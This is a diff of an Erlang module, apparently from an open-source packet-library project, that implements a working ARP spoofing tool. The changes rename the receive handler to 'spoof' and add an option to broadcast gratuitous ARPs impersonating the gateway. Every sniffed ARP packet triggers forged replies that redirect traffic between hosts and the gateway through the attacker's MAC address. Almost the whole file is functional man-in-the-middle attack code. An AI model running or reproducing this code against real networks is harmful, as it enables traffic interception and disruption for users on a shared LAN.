@@ -35,8 +35,8 @@
 
 -include("epcap_net.hrl").
 
--export([start/0, start/1, stop/0, recv/4]).
--export([start_link/1]).
+-export([start/0, start/2, stop/0, spoof/4]).
+-export([start_link/2]).
 -export([init/1, handle_call/3, handle_cast/2, handle_info/2,
         terminate/2, code_change/3]).
 
@@ -53,23 +53,29 @@
     }).
 
 
-
-recv(Sha, Sip, Tha, Tip) ->
-    gen_server:call(?MODULE, {arp, Sha, Sip, Tha, Tip}).
+%%--------------------------------------------------------------------
+%%% Exports
+%%--------------------------------------------------------------------
+start() ->
+    [Dev] = packet:default_interface(),
+    start(Dev, []).
+start(Dev, Opt) ->
+    start_link(Dev, Opt).
 
 stop() ->
     gen_server:call(?MODULE, stop).
 
-start() ->
-    [Dev] = packet:default_interface(),
-    start(Dev).
-start(Dev) ->
-    start_link(Dev).
+start_link(Dev, Opt) ->
+    gen_server:start_link({local, ?SERVER}, ?MODULE, [Dev, Opt], []).
 
-start_link(Dev) ->
-    gen_server:start_link({local, ?SERVER}, ?MODULE, [Dev], []).
+spoof(Sha, Sip, Tha, Tip) ->
+    gen_server:call(?MODULE, {arp, Sha, Sip, Tha, Tip}).
 
-init([Dev]) ->
+
+%%--------------------------------------------------------------------
+%%% Callbacks
+%%--------------------------------------------------------------------
+init([Dev, Opt]) ->
     {ok, PL} = inet:ifget(Dev, [addr, hwaddr]),
 
     IP = proplists:get_value(addr, PL),
@@ -81,8 +87,15 @@ init([Dev]) ->
 
     spawn_link(fun() -> sniff(Socket) end),
 
+    Active = proplists:get_value(active, Opt, false),
+
     % Send a gratuitous arp spoofing the gateway
-    spawn_link(fun() -> gateway_arp(Socket, Ifindex, MAC, GWIP) end),
+    case Active of
+        true ->
+            spawn_link(fun() -> gateway_arp(Socket, Ifindex, MAC, GWIP) end);
+        false ->
+            ok
+    end,
 
     {ok, #state{
             s = Socket,
@@ -95,56 +108,33 @@ init([Dev]) ->
 
 
 handle_call({arp, Sha, Sip, Tha, Tip}, _From, #state{ip = IP, mac = MAC} = State)
-    when Sip == IP; Tip == IP; Sha == MAC; Tha == MAC; Sip == Tip; Sha == Tha ->
+    when Sip == IP; Tip == IP; Sha == MAC; Tha == MAC ->
     {reply, ok, State};
 handle_call({arp, Sha, Sip, Tha, Tip}, _From, #state{
         mac = MAC,
-        s = Socket,
-        i = Ifindex,
         gwip = GWIP,
         gwmac = GWMAC
     } = State) ->
 
-    % Don't reply to the broadcast addresses
-    case Tha of
-        N when N == <<0,0,0,0,0,0>>; N == <<16#FF,16#FF,16#FF,16#FF,16#FF,16#FF>> ->
-            ok;
-        _ ->
-            ok = packet:send(Socket, Ifindex,
-                make_arp(?ARPOP_REPLY, MAC, Sip, Tha, Tip)),
+    % Inform the source and target that our MAC
+    % address is their peer
+    ok = send_arp(MAC, Sip, Tha, Tip, State),
+    ok = send_arp(MAC, Tip, Sha, Sip, State),
 
-            ok = packet:send(Socket, Ifindex,
-                make_arp(?ARPOP_REQUEST, MAC, Sip, Tha, Tip)),
+    % Also tell them we are the gateway. Never know,
+    % might believe us.
+    ok = send_arp(MAC, GWIP, Tha, Tip, State),
+    ok = send_arp(MAC, GWIP, Sha, Sip, State),
 
-            ok = packet:send(Socket, Ifindex, 
-                make_arp(?ARPOP_REPLY, MAC, Tip, GWMAC, GWIP)),
-
-            case Tha of
-                GWMAC -> ok;
-                _ ->
-                    ok = packet:send(Socket, Ifindex, 
-                        make_arp(?ARPOP_REPLY, MAC, GWIP, Tha, Tip))
-            end
-    end,
-
-    % Tell the hosts that we are the gateway
-    ok = packet:send(Socket, Ifindex, 
-        make_arp(?ARPOP_REPLY, MAC, GWIP, Sha, Sip)),
-
-    ok = packet:send(Socket, Ifindex, 
-        make_arp(?ARPOP_REPLY, MAC, Tip, Sha, Sip)),
-
-    ok = packet:send(Socket, Ifindex,
-        make_arp(?ARPOP_REQUEST, MAC, Tip, Sha, Sip)),
-
-    ok = packet:send(Socket, Ifindex,
-        make_arp(?ARPOP_REPLY, MAC, Sip, GWMAC, GWIP)),
+    % And while we're here, tell the gateway we
+    % are in fact the source and target IPs
+    ok = send_arp(MAC, Tip, GWMAC, GWIP, State),
+    ok = send_arp(MAC, Sip, GWMAC, GWIP, State),
 
     {reply, ok, State};
 
 handle_call(stop, _From, State) ->
     {stop, normal, ok, State}.
-
 
 handle_cast(_Msg, State) ->
     {noreply, State}.
@@ -156,10 +146,15 @@ handle_info(Info, State) ->
 
 terminate(_Reason, _State) ->
     ok.
+
 code_change(_OldVsn, State, _Extra) ->
     {ok, State}.
 
 
+%%--------------------------------------------------------------------
+%%% Read ARP packets from the network and send them to the
+%%% gen_server
+%%--------------------------------------------------------------------
 sniff(Socket) ->
     case procket:recvfrom(Socket, 65535) of
         nodata ->
@@ -173,43 +168,72 @@ sniff(Socket) ->
             error_logger:error_report(Error)
     end.
 
-filter([#ether{}, #arp{sha = Sha, tha = Tha, sip = Sip, tip = Tip}, _Payload]) when Tip =/= {0,0,0,0} ->
-    ?MODULE:recv(Sha, Sip, Tha, Tip);
+% Ignore gratuitous arps
+filter([#ether{},
+        #arp{sha = Sha, tha = Tha, sip = Sip, tip = Tip},
+        _Payload]) when Sha == Tha; Sip == Tip ->
+    ok;
+filter([#ether{},
+        #arp{sha = Sha, tha = Tha, sip = Sip, tip = Tip},
+        _Payload]) ->
+    spoof(Sha, Sip, Tha, Tip);
 filter(_) ->
     ok.
 
 
-make_arp(Type, SrcMac, SrcIP, DstMac, DstIP) ->
+%%--------------------------------------------------------------------
+%%% Internal functions
+%%--------------------------------------------------------------------
+
+% duplicate MAC errors
+% Do not reply to the broadcast
+% Avoid spoofing the gateway to the gateway
+send_arp(Sha, Sip, Tha, Tip, _) when
+    Tha == <<0,0,0,0,0,0>>;
+    Tha == <<16#FF,16#FF,16#FF,16#FF,16#FF,16#FF>>;
+    Sha == Tha; Sip == Tip ->
+    ok;
+send_arp(Sha, Sip, Tha, Tip, #state{
+    s = Socket, i = Ifindex
+}) ->
+    ok = packet:send(Socket, Ifindex,
+        make_arp(?ARPOP_REPLY, Sha, Sip, Tha, Tip)),
+
+    ok = packet:send(Socket, Ifindex,
+        make_arp(?ARPOP_REQUEST, Sha, Sip, Tha, Tip)).
+
+
+make_arp(Type, Sha, Sip, Tha, Tip) ->
     Ether = epcap_net:ether(#ether{
-            dhost = DstMac,
-            shost = SrcMac,
+            dhost = Tha,
+            shost = Sha,
             type = ?ETH_P_ARP
         }),
 
     Arp = epcap_net:arp(#arp{
             op = Type,
-            sha = SrcMac,
-            sip = SrcIP,
-            tha = DstMac,
-            tip = DstIP
+            sha = Sha,
+            sip = Sip,
+            tha = Tha,
+            tip = Tip
         }),
 
     list_to_binary([Ether, Arp, <<0:128>>]).
 
-gratuitous_arp(Type, SrcMac, SrcIP) ->
-    make_arp(Type, SrcMac, SrcIP, ?ETHER_BROADCAST, SrcIP).
+gratuitous_arp(Sha, Sip) ->
+    make_arp(?ARPOP_REPLY, Sha, Sip, ?ETHER_BROADCAST, Sip).
 
-gateway_arp(Socket, Ifindex, SrcMac, SrcIP) ->
-    gateway_arp(Socket, Ifindex, SrcMac, SrcIP, 0).
-gateway_arp(Socket, Ifindex, SrcMac, SrcIP, N) ->
-    error_logger:info_report([{gratuitous, SrcMac, SrcIP}]),
+gateway_arp(Socket, Ifindex, Sha, Sip) ->
+    gateway_arp(Socket, Ifindex, Sha, Sip, 0).
+gateway_arp(Socket, Ifindex, Sha, Sip, N) ->
+    error_logger:info_report([{gratuitous, Sha, Sip}]),
     ok = packet:send(Socket, Ifindex,
-        gratuitous_arp(?ARPOP_REPLY, SrcMac, SrcIP)),
+        gratuitous_arp(Sha, Sip)),
     Sleep = case N of
         N when N < 4 -> 1000;
         N -> 2000
     end,
     timer:sleep(Sleep),
-    gateway_arp(Socket, Ifindex, SrcMac, SrcIP, N+1).
+    gateway_arp(Socket, Ifindex, Sha, Sip, N+1).
 
 
